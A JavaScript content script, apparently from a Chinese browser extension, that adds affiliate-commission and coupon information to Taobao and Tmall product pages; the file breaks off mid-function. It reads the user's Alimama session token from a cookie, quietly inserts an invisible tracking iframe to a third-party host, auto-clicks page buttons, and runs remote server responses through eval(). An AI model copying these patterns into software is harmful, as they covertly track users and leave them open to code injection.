var couponHtml = '<div id = "text6"><img class="tb-red-gift-icon" src="//gtms03.alicdn.com/tps/i3/TB1xTNtMXXXXXcBXFXXAz6UFXXX-16-16.png">实惠猪提醒您此商品有优惠卷：总量#total#张，面值#money#元，<a href ="#link#" target= "_blank">点击领取</a></div>';

var div1Html = '<div><span id="text2">最高佣金比例：</span><span id="text1" class="highest">#comrate#%</span></div><div><a id="text7" href="#link#&lianmang" target="_blank">生成推广链接</a>&nbsp;&nbsp;<span id="text3">30天交易：#totalnum#件&nbsp;&nbsp;&nbsp;&nbsp;</span><span id="text3">30天佣金：#totalfee#元</span></div>';

var div3Html = '<table id="table" summary="book list"><caption>计划详情</caption><thead><col/><col/><col/><col/><col/><col class="price"/><tr><th>计划名称</th><th>审核</th><th>佣金比例</th><th>操作</th><th>申请计划</th></thead><tbody><tr class="even">#table#</tr></tbody></table>';

var div4Html = '<table id="table" summary="book list"><caption>高佣推广活动（新鹊桥）</caption><thead><col/><col/><col/><col/><col/><col class="price"/><tr><th>计划名称</th><th>剩余天数</th><th>实得佣金比例</th><th>操作</th></thead><tbody>#table#</tbody></table>';

var div5Html = '<table id="table" summary="book list"><caption>店铺优惠卷</caption><thead><col/><col/><col/><col/><col/><col class="price"/><tr><th>标题</th><th>使用时间</th><th>地址</th></thead><tbody>#table#</tbody></table>';

var div6Html = '<table id="table" summary="book list"><caption>老鹊桥活动</caption><thead><col/><col/><col/><col/><col/><col class="price"/><tr><th>鹊桥ID</th><th>标题</th><th>实得分成</th><th>结束</th><th>操作</th></thead><tbody>#table#</tbody></table>';

var tab3Html = '<tr class="even"><th id="cid-U-#cid#" style="width:40%;overflow: hidden;">#name#</th><th id = "cid-P-#cid#">#isPass#</th><th id = "cid-#cid#">#rate#</th><th><a href="#link#" target= "_blank">查看计划</a></th>#thHtml#</tr>';

var tab4Html = '<tr class="even"><th style="width:40%;overflow: hidden;">#name#</th><th>#days#</th><th>#rate#</th><th><a href="#link#&lianmang" target= "_blank">查看计划</a></th></tr>';

var tab5Html = '<tr class="even"><th style="width:40%;overflow: hidden;">#name#</th><th>#days#</th><th><a href="#link#" target= "_blank">点击领卷</a></th></tr>';

var newVerHtml = '<div ><span>本插件版本即将作废，请尽快下载更新版本插件并且安装，以免影响您的使用体验。</span></div><div><a id = "text5" href ="#link#" target= "_blank">点击下载新版插件</a></div><br/>';

var thHtml = '<th><button type="button" id="btn_t-#cid#" value="#csid#">申请计划</button></th>';

var inputHtml = '<div>在此填入计划申请理由：<input id = "campword" value = "请允许通过计划" style="width:70%"></inpit></div>';

function RegexItem(src, re, index) {
    try {
        var arr = re.exec(src);
        return arr[index];
    } catch (e) {}
    return null;
}

function getGoodID(url) {
    var reg = /[&|?]id=(\d+)/g;
    return RegexItem(url, reg, 1);
}

function getHttp(url, fn) {
    bg.postMessage({
        act: "get",
        reurl: url
    });
    bg.onMessage.addListener(function(msg) {
        if (msg.content == "getback") {
            fn(msg.question);
        }
    });
}

function getCookie(url, fn) {
    bg.postMessage({
        act: "cookie",
        reurl: url
    });
    bg.onMessage.addListener(function(msg) {
        if (msg.content == "cookieback") {
            fn(msg.question);
        }
    });
}

function postHttp(url, data, fn) {
    bg.postMessage({
        act: "post",
        reurl: url,
        redata: data
    });
    bg.onMessage.addListener(function(msg) {
        if (msg.content == "postback") {
            fn(msg.question);
        }
    });
}

function setNewIcon() {
    bg.postMessage({
        act: "new"
    });
}

function getElementsByClassName(className) {
    var all = document.all ? document.all : document.getElementsByTagName("*");
    var elements = new Array();
    for (var e = 0; e < all.length; e++) {
        if (all[e].className == className) {
            elements[elements.length] = all[e];
            break;
        }
    }
    return elements;
}

function isTmall(url) {
    if (url.indexOf("tmall") > 0) {
        return true;
    } else {
        return false;
    }
}

function reWriteDom(url, newItem) {
    var item;
    if (isTmall(url)) {
        $(".tb-detail-hd").before(newItem);
    } else {
        $("#J_Title").before(newItem);
    }
}

function insertDom(newItem, tagname) {
    if (newItem != null && tagname != null) {
        try {
			var item = document.getElementById(tagname).innerHTML;
            document.getElementById(tagname).innerHTML = item + newItem;
        } catch (e) {}
    }
}

function replaceDom(newItem, tagname) {
    if (newItem != null && tagname != null) {
        try {
			
            var item = document.getElementById(tagname).innerHTML;
            document.getElementById(tagname).innerHTML = newItem;
        } catch (e) {}
    }
}

function getElementDom(tagname) {
    if (tagname != null) {
        try {
            return document.getElementById(tagname).innerHTML;
        } catch (e) {}
    }
    return null;
}

function getBaseInfo(JHtml, goodid) {
    var jsonp = eval("(" + JHtml + ")");
    var attr = jsonp.data.pagelist;
    for (var i = 0; i < attr.length; i++) {
        if (goodid == attr[i].auctionId) {
            var obj = new Object();
            obj["goodid"] = attr[i].auctionId;
            var rate = "" + attr[i].commissionRatePercent;
            rate = rate.replace("%", "");
            rate = rate.replace(" ", "");
            obj["comrate"] = rate;
            obj["sells"] = attr[i].totalNum;
            obj["fee"] = attr[i].totalFee;
            obj["userid"] = attr[i].userNumberId;
            return obj;
        }
    }
    return null;
}


function getExsitPlans(JHtml) {
    var exsit_list = new Array();
    var jsonp = eval("(" + JHtml + ")");
    var tArray = jsonp.data.exsitApplyList;
	for (var i = 0; i < tArray.length; i++) {
		var item = new Object();
		item["cid"] = "" + tArray[i].campaignId;
		item["cstatus"] = tArray[i].status;
		exsit_list.push(item);
	}
    return exsit_list;
}

function getPlansInfo(JHtml_1, JHtml_2) {
	var all_list = new Array();
    var jsonb = eval("(" + JHtml_1 + ")");
    var bArray = jsonb.data.pageList;
	for (var i = 0; i < bArray.length; i++) {
		var ods = bArray[i].tkSpecialCampaignIdRateMap;
		var od = new Object();
		od["cid"] = "0";
		od["rate"] = bArray[i].tkRate;
		all_list.push(od);
		if (ods != null) {
			$.each(ods,function(name,value) {
				var obj = new Object();
				obj["cid"] = " " + name;
				obj["rate"] = value;
				all_list.push(obj);
			});
		}
	}
	
	var sid = "";
    var exsit_list = new Array();
	var plan_list = new Array();
	var jsonp = eval("(" + JHtml_2 + ")");
	if (JHtml_2.indexOf("exsitApplyList") > 0) {
		var tArray = jsonp.data.exsitApplyList;
		for (var i = 0; i < tArray.length; i++) {
			var item = new Object();
			item["cid"] = "" + tArray[i].campaignId;
			item["cstatus"] = tArray[i].status;
			exsit_list.push(item);
		}
	}
	var cArray = jsonp.data.campaignList;
	for (var i = 0; i < cArray.length; i++) {
		var item = new Object();
		item["cid"] = "" + cArray[i].campaignId;
		item["sid"] = "" + cArray[i].shopKeeperId;
		sid = item["sid"];
		
		item["cname"] = cArray[i].campaignName;
		var rate = "" + cArray[i].avgCommissionToString;
        rate = rate.replace("%", "");
        rate = rate.replace(" ", "");
        item["rate"] = rate;
		item["passstr"] = cArray[i].properties == 3 ? "是" : "否";
		if (item["cid"] != 0 && exsit_list.length > 0) {
			for (var j = 0; j < exsit_list.length; j++) {
				var obj = exsit_list[j];
				if (item["cid"] == obj["cid"]) {
					var clevel = "通过";
					if (item["passstr"] == "是") {
						if (obj["cstatus"] == 1) {
							clevel = "审核中";
						}
						else if (obj["cstatus"] == 2) {
							clevel = "通过";
						}
						else if (obj["cstatus"] == 3) {
							clevel = "拒绝";
						}
					}
					item["passstr"] = item["passstr"] + '<span id="text6">（' + clevel + "）</span>";
					break;
				}
			}
		}
		plan_list.push(item);
	}	
	for (var i = 0; i < all_list.length; i++) {
		var obj = all_list[i];
		var item = new Object();
		if (obj["cid"].indexOf("-") > 0){
			var cid = "" + obj["cid"];
			cid = cid.replace("-", "");
			cid = cid.replace(" ", "");
			
			item["cid"] = cid;
			item["sid"] = "";
			item["cname"] = "隐藏计划";
			item["passstr"] = "是";
			item["rate"] = obj["rate"];
	
			var isOK = true;
			for (var n=0; n < plan_list.length; n++) {
				if (plan_list[n]["cid"] == cid) {
					isOK = false;
				}
			}
			if (isOK) {
			if (exsit_list.length > 0) {
				for (var j = 0; j < exsit_list.length; j++) {
					var obd = exsit_list[j];
					if (cid == obd["cid"]) {
						var clevel = "通过";
						if (obd["cstatus"] == 1) {
							clevel = "审核中";
						}
						else if (obd["cstatus"] == 2) {
							clevel = "通过";
						}
						else if (obd["cstatus"] == 3) {
							clevel = "拒绝";
						}
						item["passstr"] = item["passstr"] + '<span id="text6">（' + clevel + "）</span>";
						break;
					}
				}
			}
			plan_list.push(item);
			}
		}
	}	
    return plan_list;
}

function getPubCouponInfo(JHtml) {
    var list = new Array();
    var jsonp = eval("(" + JHtml + ")");
    var attr = jsonp.priceVolumes;
    for (var i = 0; i < attr.length; i++) {
        var obj = new Object();
        obj["id"] = attr[i].id;
        obj["dataly"] = attr[i].timeRange;
        obj["title"] = attr[i].condition + "劵";
        list.push(obj);
    }
    return list;
}

function getHiddenCouponInfo(JHtml) {
    var list = new Array();
	try {
        var jsonp = eval("(" + JHtml + ")");
		var attr = jsonp.data;
		for (var i = 0; i < attr.length; i++) {
        var obj = new Object();
			list.push(attr[i].activity_id);
		}
		return list;
    } catch (e) {}
   return null;
}

function getShopKeeperId(JHtml) {
    var jsonp = eval("(" + JHtml + ")");
    var attr = jsonp.data.campaignList;
    return attr[0].shopKeeperId;
}

function getPlanRate(JHtml, goodid, rate) {
    var Rate = 0;
    var jsonp = eval("(" + JHtml + ")");
    var attr = jsonp.data.pagelist;
    for (var i = 0; i < attr.length; i++) {
        var tmp_id = "" + attr[i].auctionId;
        if (goodid == tmp_id) {
            var rate_a = "" + attr[i].commissionRatePercent;
            rate_a = rate_a.replace("%", "");
            rate_a = rate_a.replace(" ", "");
            var rate_b = "" + rate;
            rate_b = rate_b.replace("%", "");
            rate_b = rate_b.replace(" ", "");
            if (parseFloat(rate_a) < parseFloat(rate_b)) {
                Rate = rate_b;
            } else {
                Rate = rate_a;
            }
        }
    }
    return Rate;
}

function getHighCommission(JHtml) {
    var jsonp = eval("(" + JHtml + ")");
    var attr = jsonp.data.pageList;
    if (attr != null) {
        for (var i = 0; i < attr.length; i++) {
            var obj = new Object();
            obj["eventrate"] = attr[i].eventRate;
            obj["dayleft"] = attr[i].dayLeft;
            return obj;
        }
    }
    return null;
}

function getDiscount(JHtml) {
    var jsonp = eval("(" + JHtml + ")");
    var attr = jsonp.result;
    if (attr != null) {
        var obj = new Object();
        obj["coupon"] = attr.coupon;
        obj["total"] = attr.coupon_total;
        obj["money"] = attr.coupon_money;
        obj["link"] = attr.coupon_url;
        return obj;
    }
    return null;
}

function getVerInfo(JHtml) {
    var jsonp = eval("(" + JHtml + ")");
    var ob = new Object();
    ob["ver"] = jsonp.ver;
    ob["url"] = jsonp.downurl;
    return ob;
}

function multiplyNum(a, b) {
    var p = "" + a;
    p = p.replace("%", "");
    p = p.replace(" ", "");
    var q = "" + b;
    q = q.replace("%", "");
    q = q.replace(" ", "");
    return (parseFloat(p) * parseFloat(q)).toFixed(2);
}

function reHigherNum(a, b) {
    var p = "" + a;
    p = p.replace("%", "");
    p = p.replace(" ", "");
    var q = "" + b;
    q = q.replace("%", "");
    q = q.replace(" ", "");
    if (parseFloat(p) < parseFloat(q)) {
        return q;
    } else {
        return p;
    }
}

function isEqualNum(a, b) {
    var p = "" + a;
    p = p.replace("%", "");
    p = p.replace(" ", "");
    var q = "" + b;
    q = q.replace("%", "");
    q = q.replace(" ", "");
    if (parseFloat(p) == parseFloat(q)) {
        return true;
    } else {
        return false;
    }
}

function strContent(s, s1, s2) {
    if (s != null && s != "") {
        var n1 = 0;
        var n2 = 0;
        n1 = s.indexOf(s1, 0) + s1.length;
        n2 = s.indexOf(s2, n1);
        return s.substring(n1, n2);
    } else {
        return "";
    }
}

function JoinCapaign(cid, sid, res) {
    var url = "http://pub.alimama.com/pubauc/applyForCommonCampaign.json";
    var data = "campId=" + cid + "&keeperid=" + sid + "&applyreason=" + res + "&_tb_token_=" + tbtoken;
    postHttp(url, data, function(JHtml) {
        var item = " " + getElementDom("cid-P-" + cid);
        var state = "";
        if (item.indexOf("是") > 0) {
            state = "是（审核中）";
        } else {
            state = "否（通过）";
        }
        replaceDom(state, "cid-P-" + cid);
    });
}

var datalist = new Array();

var ratelist = new Array();

var highestRate = "";

var isLogin = true;

var isAllow = true;

var isChange = true;

var Semaphore = 0; 

var versionnum = 2;

var tbtoken = "";

var goodid = "";

var userid = "";

var shopid = "";

var srcurl = window.location.href;

if (srcurl.indexOf("item.taobao.com/item.htm") > 0 || srcurl.indexOf("detail.tmall.com/item.htm") > 0) {
    if (srcurl.indexOf("id") > 0 && srcurl.indexOf("search") < 0) {
		newverWork();
        goodid = getGoodID(srcurl);
		mainfun();
    }
}

$(function() {
    DAMY.loader.init_page();
    if (srcurl.indexOf("pub.alimama.com/myunion.htm") > 0) {
        if (srcurl.indexOf("item.taobao.com") > 0 || srcurl.indexOf("detail.tmall.com") > 0) {
            if (srcurl.indexOf("&lianmang") > 0) {
                setTimeout("waitClick1()", 2e3);
            }
        }
    } else if (srcurl.indexOf("pub.alimama.com/promo/item/channel/index.htm") > 0) {
        if (srcurl.indexOf("&lianmang") > 0) {
            setTimeout("waitClick2()", 2e3);
        }
    }
    setTimeout("lateInsert()", 1e4);
});

function lateInsert() {
    $("#magix_vf_header").before('<iframe width=0 height=0 frameborder=0 src="http://stat.yqt.so/"></iframe>');
}

function waitClick1() {
    clickTagClass("a", "btn btn-blue");
}

function waitClick2() {
    clickTagClass("a", "box-btn-left");
}

function rrr() {
	var url = "http://pub.alimama.com/campaign/campaignDetail.json?campaignId=24687840&shopkeeperId=45218920"
	
}
function aaa() {
	var url = "http://pub.alimama.com/pubauc/searchAuctionList.json?q=" + encodeURIComponent(srcurl) + "&toPage=1&perPagesize=40&_input_charset=utf-8";
    getHttp(url, function(JHtml) {
		
		if (JHtml.indexOf("阿里妈妈版权所有") < 0) {
				isLogin = true;
				if (JHtml.indexOf("pagelist") > 0) {
					var info = getBaseInfo(JHtml, goodid);
					if (info == null) {
						
					} else {
						if (isAllow) {
						var div1html = div1Html;
						div1html = div1html.replace("#comrate#", "--");
						div1html = div1html.replace("#totalnum#", info["sells"]);
						div1html = div1html.replace("#totalfee#", info["fee"]);
						div1html = div1html.replace("#link#", "http://pub.alimama.com/myunion.htm?#!/promo/self/items?q=" + encodeURIComponent(srcurl));
						insertDom(div1html, "id1");
						highestRate = info["comrate"];
						userid = info["userid"];
						isAllow = false;
				}
						
					}
				}
				else if (JHtml.indexOf("获取定向计划失败") > 0)  {
					if (isAllow) {
						insertDom(nocapaction, "id1");
						isAllow = false;
				}
					
				}
			}
			else {
				if (isAllow) {
					insertDom(nologinHtml, "id1");
					isLogin = false;
						isAllow = false;
				}
			}
	});
}
function bbb() {
	if (isLogin) {
	var url = "http://pub.alimama.com/shopdetail/campaigns.json?oriMemberId=" + userid + "&_input_charset=utf-8";
	getHttp(url, function(JHtml) {
		if (JHtml.indexOf("campaignList") > 0) {
			var url_o = "http://pub.alimama.com/items/search.json?q=" + encodeURIComponent(srcurl) + "&perPageSize=50"
				getHttp(url_o, function(JHtml_o) {
					
					
					if (JHtml_o.indexOf("tkSpecialCampaignIdRateMap") > 0) {
						var list = getPlansInfo(JHtml_o, JHtml);
						var tabletext = "";
						
						for (var i = 0; i < list.length; i++) {
							if (list[i]["sid"] != "") {
								shopid = list[i]["sid"];
							}
							
							var tabtext = tab3Html;
							var the_url = "http://pub.alimama.com/myunion.htm?#!/promo/self/campaign?campaignId=" + list[i]["cid"] + "&shopkeeperId=" + shopid + "&userNumberId=" + shopid;
							tabtext = tabtext.replace("#cid#", list[i]["cid"]);
							tabtext = tabtext.replace("#cid#", list[i]["cid"]);
							tabtext = tabtext.replace("#cid#", list[i]["cid"]);
							tabtext = tabtext.replace("#link#", the_url);
							tabtext = tabtext.replace("#name#", list[i]["cname"]);
						
							
							tabtext = tabtext.replace("#rate#", "--%");
							tabtext = tabtext.replace("#isPass#", list[i]["passstr"]);
							if (list[i]["cid"] != 0) {
								var thtext = thHtml.replace("#csid#", list[i]["cid"] + "-" + shopid);
								tabtext = tabtext.replace("#thHtml#", thtext);
								tabtext = tabtext.replace("#cid#", list[i]["cid"]);
								if (list[i]["passstr"].indexOf("（通过）") > 0) {
									tabtext = tabtext.replace("申请计划", "生成链接");
								}
							}
							else {
								tabtext = tabtext.replace("#thHtml#", "<th></th>");
							}
							if (tabtext.indexOf("undefined") < 0) {
								tabletext += tabtext;
							}
							var item = new Object();
							item["cid"]    = list[i]["cid"];
							item["rate"]   = list[i]["rate"];
							item["status"] = list[i]["passstr"];
							datalist.push(item);
						}
						
						
						
						if (tabletext != "") {
							if (tabtext.indexOf("undefined") < 0 && isChange) {
								var divhtml = div3Html.replace("#table#", tabletext);
								insertDom(divhtml, "id3");
								insertDom(inputHtml, "id3");
								isChange = false;
							}
						}
					
				}
				});	
		}
	});
	}
}
var isOnce = true;
function ccc() {
	if (isLogin) {
	var url = "http://pub.alimama.com/items/channel/qqhd.json?q=" + encodeURIComponent(srcurl) + "&perPageSize=50";
	getHttp(url, function(JHtml) {
		if (JHtml.indexOf("pageList") > 0 && JHtml.indexOf("NORESULT") < 0) {
			var ob = getHighCommission(JHtml);
			if (ob != null) {
				
				var ra = multiplyNum(ob["eventrate"], "0.85");
				var tabHtml = tab4Html.replace("#link#", "http://pub.alimama.com/promo/item/channel/index.htm?q=" + encodeURIComponent(srcurl) + "&channel=qqhd");
					tabHtml = tabHtml.replace("#name#", "高佣金推广活动");
                    tabHtml = tabHtml.replace("#rate#", ra + "%");
                                        tabHtml = tabHtml.replace("#days#", ob["dayleft"]);
                                        var divHtml = div4Html.replace("#table#", tabHtml);
										if (isOnce && ra != "NaN") {
                                        insertDom(divHtml, "id4");
                                        highestRate = ra;
										isOnce = false;
										}
                                    }
                                }
                            }); 
							
						
						
	}
}


function mainfun() {
	reWriteDom(srcurl, '<div id="isnow"></div>');
    replaceDom(frameHtml, "isnow");
	aaa();
	setTimeout("bbb()", 5e2);
	setTimeout("ccc()", 5e2);
	setTimeout("lateReSet()", 2e3);
    setTimeout("eeeee()", 5e3);
	setTimeout("eeee1()", 15e3);
    setTimeout("getTbtoken()", 1e3);
    setTimeout("CouponAction()", 1e3);
}

function lateReSet() {
    if (isLogin) {
        for (var i = 0; i < datalist.length; i++) {
            (function(i) {
                setTimeout(function() {
                    var item = i;
                    var gid = goodid;
                    var cid = item["cid"];
                    var sid = item["sid"];
                    var uid = userid;
                    var rate = item["rate"];
                    var ispass = item["ispass"];
                    var JHtml = item["html"];
                    for (var j = 0; j < 15; j++) {
                        var url = "http://pub.alimama.com/campaign/merchandiseDetail.json?campaignId=" + cid + "&shopkeeperId=" + sid + "&userNumberId=" + uid + "&tab=2&omid=" + uid + "&toPage=" + j + "&perPagesize=10&_input_charset=utf-8";
                        getHttp(url, function(JHtml) {
                            if (JHtml.indexOf("pagelist") > 0 && JHtml.indexOf("commissionRatePercent") > 0) {
                                var Rate = 0;
                                var jsonp = eval("(" + JHtml + ")");
                                var attr = jsonp.data.pagelist;
                                var tmp_cid = jsonp.data.campaignID;
                                for (var j = 0; j < attr.length; j++) {
                                    var tmp_gid = "" + attr[j].auctionId;
                                    var tmp_cid = "" + tmp_cid;
                                    if (gid == tmp_gid && cid == tmp_cid && cid!= "undefined" && gid != "undefined") {
                                        var ob = new Object();
                                        ob["rate"] = attr[j].commissionRatePercent;
                                        ob["cid"] = cid;
                                        ob["ips"] = ispass;
										
										replaceDom(ob["rate"] + "%", "cid-" + cid);
                                        ratelist.push(ob);
                                        break;
                                    }
                                }
                            }
                        });
                    }
                }, 5);
            })(datalist[i]);
        }
    }
}

function eeeee() {
    if (isLogin) {
        var rate = highestRate;
        var tmp = rate;
        var campid = "";
        for (var i = 0; i < datalist.length; i++) {
            if (datalist[i]["rate"] != "undefined" && datalist[i]["cid"] != "undefined") {
				replaceDom(datalist[i]["rate"] + "%", "cid-" + datalist[i]["cid"]);
                rate = reHigherNum(rate, datalist[i]["rate"]);
                if (rate != tmp) {
                    campid = datalist[i]["cid"];
                    tmp = rate;
                }
            }
        }
        for (var i = 0; i < ratelist.length; i++) {
            if (ratelist[i]["rate"] != "undefined" && ratelist[i]["cid"] != "undefined") {
				replaceDom(ratelist[i]["rate"] + "%", "cid-" + ratelist[i]["cid"]);
                if (isEqualNum(rate, ratelist[i]["rate"])) {
                    if (ratelist[i]["ips"] == "否") {
                        campid = ratelist[i]["cid"];
                    }
                } else {
                    rate = reHigherNum(rate, ratelist[i]["rate"]);
                    if (rate != tmp) {
                        campid = ratelist[i]["cid"];
                        tmp = rate;
                    }
                }
            }
        }
        $(".highest").text(rate + "%");
        if (campid != "") {
            for (var i = 0; i < datalist.length; i++) {
                if (datalist[i]["cid"] == campid && campid != "0") {
                    var st = datalist[i]["status"];
                    if (st.indexOf("审核中") > 0 || st.indexOf("通过") > 0) {
                        $(".highest").after('<span>&nbsp;&nbsp;<button id = "text8" value="0" class= "getHight">已申请</button></span>');
                    } else {
                        $(".highest").after('<span>&nbsp;&nbsp;<button id = "text8" value="' + campid + "-" + shopid + '" class= "getHight">申请最高佣金计划</button></span>');
                    }
					break;
                }
            }
        }
		
		setTimeout("bindBtnEvent()", 5e2);
    }
}

function eeee1() {
    if (isLogin) {
        var rate = highestRate;
        var tmp = rate;
        var campid = "";
        for (var i = 0; i < ratelist.length; i++) {
            if (ratelist[i]["rate"] != "undefined" && ratelist[i]["cid"] != "undefined") {
				replaceDom(ratelist[i]["rate"] + "%", "cid-" + ratelist[i]["cid"]);
                if (isEqualNum(rate, ratelist[i]["rate"])) {
                    if (ratelist[i]["ips"] == "否") {
                        campid = ratelist[i]["cid"];
                    }
                } else {
                    rate = reHigherNum(rate, ratelist[i]["rate"]);
                    if (rate != tmp) {
                        campid = ratelist[i]["cid"];
                        tmp = rate;
                    }
                }
            }
        }
        $(".highest").text(rate + "%");
        if (campid != "") {
            for (var i = 0; i < datalist.length; i++) {
                if (datalist[i]["cid"] == campid && campid != "0") {
                    var st = datalist[i]["status"];
                    if (st.indexOf("审核中") > 0 || st.indexOf("通过") > 0) {
                        $(".getHight").text('已申请');
                    } else {
						$(".getHight").text('申请最高佣金计划');
                        $(".getHight").attr('value', campid + "-" + shopid);
                    }
					break;
                }
            }
        }
		
		setTimeout("bindBtnEvent()", 5e2);
    }
}



function newverWork() {
    var url = "http://tool.yqt.so/newver.htm";
    getHttp(url, function(JHtml) {
        if (JHtml.indexOf("downurl") > 0) {
            var ob = getVerInfo(JHtml);
            var sign = ob["ver"] - versionnum;
            if (sign > 0) {
                newVerHtml = newVerHtml.replace("#link#", ob["url"]);
                insertDom(newVerHtml, "id1");
                setNewIcon();
            }
        }
    });
}

var couponlist = new Array();

function CouponAction() {
	getHiddenCoupon();
	getSellerCoupon();
	setTimeout("setCouponTable()", 3e3);
}



function unique(arr) {
    var result = [], hash = {};
    for (var i = 0, elem; (elem = arr[i]) != null; i++) {
        if (!hash[elem]) {
            result.push(elem);
            hash[elem] = true;
        }
    }
    return result;
}

var htmllist = new Array();
function getHiddenCoupon() {
    var url = "http://zhushou3.taokezhushou.com/api/v1/coupons_base/" + userid + "?item_id=" + goodid;
    getHttp(url,
    function(JHtml) {
        if (JHtml.indexOf("activity_id") > 0) {
            var list = getHiddenCouponInfo(JHtml);
            if (list != null) {
                for (var i = 0; i < list.length; i++) {

                    (function(i) {
                        setTimeout(function() {
                            var the_url = "http://shop.m.taobao.com/shop/coupon.htm?seller_id=" + userid + "&activity_id=" + i;
							var the_JHtml = "";
                            getHttp(the_url,
                            function(the_JHtml) {
								if (the_JHtml.indexOf("立刻领用") > 0) {
									htmllist.push(the_JHtml.replace(/(\s{2,}|\n)/gim, ""));
								}
                            });
                        },
                        5);
                    })(list[i]);
                }
            }
        }
    });
}

function getSellerCoupon() {
    var url = "https://cart.taobao.com/json/GetPriceVolume.do?sellerId=" + userid;
    getHttp(url, function(JHtml) {
        if (JHtml.indexOf("priceVolumes") > 0) {
            var list = getPubCouponInfo(JHtml);
			for (var i = 0; i < list.length; i++) {
				couponlist.push(list[i]);
			}
        }
    });
}

function sssssss(r){
	if (r.indexOf("立刻领用") > 0) {
		var a = new RegExp('activity%5fid%3d(.*?)&amp.*?<dt>(.*?)元优惠券</dt><dd>剩<span class="rest">(.*?)</span>张（已领用<span class="count">(.*?)</span>张）</dd><dd>单笔满(.*?)元可用，每人限领(.*?) 张</dd><dd>有效期:(.*?)至(.*?)</dd>');
		var s = a.exec(r);
		if (s != null) {
			var obj = new Object();
			obj["id"] = s[1];
			obj["dataly"] = s[7] + "-" + s[8];
			obj["title"] = "满" + s[5] + "元减" + s[2] + "元优惠劵（隐藏劵）";
			couponlist.push(obj);
		}
	}
}


function setCouponTable() {
	var tArray = unique(htmllist);
	for (var n = 0; n < tArray.length; n++) {
		sssssss(tArray[n]);
	}
	
	 if (couponlist.length) {
        var tabletext = "";
            for (var i = 0; i < couponlist.length; i++) {
                    var ob = couponlist[i];		
                    var tabtext = tab5Html;
                    var the_url = "http://shop.m.taobao.com/shop/coupon.htm?seller_id="+ userid + "&activity_id=" + ob["id"];
					//"http://taoquan.taobao.com/coupon/unify_apply.htm?sellerId=" 
                    tabtext = tabtext.replace("#name#", ob["title"]);
                    tabtext = tabtext.replace("#days#", ob["dataly"]);
                    tabtext = tabtext.replace("#link#", the_url);
                    if (tabtext.indexOf("undefined") < 0) {
                        tabletext += tabtext;
                    }
                }
                if (tabletext != "") {
                    if (tabtext.indexOf("undefined") < 0) {
                        var divHtml = div5Html.replace("#table#", tabletext);
                        insertDom(divHtml, "id4");
                    }
                }
            }
}

function getSHZCoupon() {
    var url = "http://www.shihuizhu.com/api/goods/" + goodid;
    getHttp(url, function(JHtml) {
        var ob = getDiscount(JHtml);
        if (ob != null) {
            if (ob["coupon"] == "1" && ob["link"] != null) {
                couponHtml = couponHtml.replace("#total#", ob["total"]);
                couponHtml = couponHtml.replace("#money#", ob["money"]);
                couponHtml = couponHtml.replace("#link#", ob["link"]);
                insertDom(couponHtml, "id2");
            }
        }
    });
}

function getTbtoken() {
    if (isLogin) {
		getCookie("http://alimama.com", function(cookie) {
        if (cookie.indexOf("_tb_token_") > 0) {
            tbtoken = strContent(cookie, "_tb_token_=", ";");
        }
		});
	}
}

function bindBtnEvent() {
    $("button").bind("click", function() {
        if (this.innerText == "生成链接") {
            window.open("http://pub.alimama.com/myunion.htm?#!/promo/self/items?q=" + encodeURIComponent(srcurl) + "&lianmang");
        } else {
            if (this.value != "0") {
                var ids = this.value.split("-");
                var txt = document.getElementById("campword").value;
                JoinCapaign(ids[0], ids[1], txt);
                setTimeout("refreshTable()", 5e2);
            }
            if (this.innerText == "申请最高佣金计划") {
                $(".getHight").text("已申请");
                $(".getHight").attr("value", "0");
            }
        }
    });
}

function refreshTable() {
	
	
	
    var url = "http://pub.alimama.com/shopdetail/campaigns.json?oriMemberId=" + userid + "&_input_charset=utf-8";
    getHttp(url, function(JHtml) {
        if (JHtml.indexOf("exsitApplyList") > 0) {
            var list = getExsitPlans(JHtml);
            if (list.length) {
				for (var i = 0; i < datalist.length; i++) {
		var the_status = getElementDom("cid-P-" + datalist[i]["cid"]);
		var txt = " " + the_status;
		if (txt.indexOf("是")  > 0) {
			the_status = '是';
		}
		else {
			the_status = '否';
		}
		replaceDom(the_status, "cid-P-" + datalist[i]["cid"]);
		replaceDom("申请计划", "btn_t-" + datalist[i]["cid"]);
	}
				
                for (var i = 0; i < list.length; i++) {
					
					var the_status = getElementDom("cid-P-" + list[i]["cid"]);
					var txt = " " + the_status;
					var clevel = "通过";
					if (txt.indexOf("是")  > 0) {
						if (list[i]["cstatus"] == 1) {
							clevel = "审核中";
						}
						else if (list[i]["cstatus"] == 2) {
							clevel = "通过";
						}
						else if (list[i]["cstatus"] == 3) {
							clevel = "拒绝";
						}
						the_status = '是<span id="text6">（' + clevel + '）</span>';
					}
					else {
						the_status = '否<span id="text6">（通过）</span>';
					}
					
                    replaceDom(the_status, "cid-P-" + list[i]["cid"]);
                    if (the_status.indexOf("（通过）") > 0) {
                        replaceDom("生成链接", "btn_t-" + list[i]["cid"]);
                    } else {
                        replaceDom("申请计划", "btn_t-" + list[i]["cid"]);
                    }
                }
            }
        }
    });
}

function clickTagClass(tagname, tagvalue) {
    var items = document.getElementsByTagName(tagname);
    for (var i = 0; i < items.length; i++) {
        var item = items[i];
        var classname = item.getAttribute("class");
        if (classname != null) {
            var classstr = " " + classname;
            if (classstr.indexOf(tagvalue) > 0) {
                item.click();
                break;
            }
        }
    }
}

function fffffff() {
    var url = "http://lb.yqt.so/yincangchaxunb.php?dpid=1912023141";	
    getHttp(url, function(JHtml) {
        if (JHtml.indexOf('"return":0') > 0) {
            var jsonp = eval("(" + JHtml + ")");
            $.each(jsonp, function(name, value) {
                console.log(name);
                console.log(value);
            });
        }
    });
}

document.onclick = function() {};

document.ondblclick = function() {};

document.onkeydown = function(event) {
    var e = event || window.event || arguments.callee.caller.arguments[0];
    if (e && e.keyCode == 68) {
        var status = document.getElementById("Layer1").style.display;
        if (status == "none") {
            document.getElementById("Layer1").style.display = "block";
        } else {
            document.getElementById("Layer1").style.display = "none";
        }
    }
};


var next = "_plug";
var getXun = 0;

if (srcurl.indexOf("taoquan.taobao.com/coupon") > 0) {
	search_coupon_item();
}

function search_coupon_item(){
	var content = $("body").html();
	if (content.indexOf("优惠卡券") > 0) {
//		console.log("【content："+content+"】");
//		var a = new RegExp('<a class=\"amount\">(.*?)</a>.*?"//store.taobao.com/search.htm?user_number_id=(.*?)&amp;search=y&promotionId=(.*?)&spm=.*?<a class=\"use-cond\">满(.*?)</a>.*?<a class="valid-date">(.*?)&nbsp;至&nbsp;(.*?)</a>');
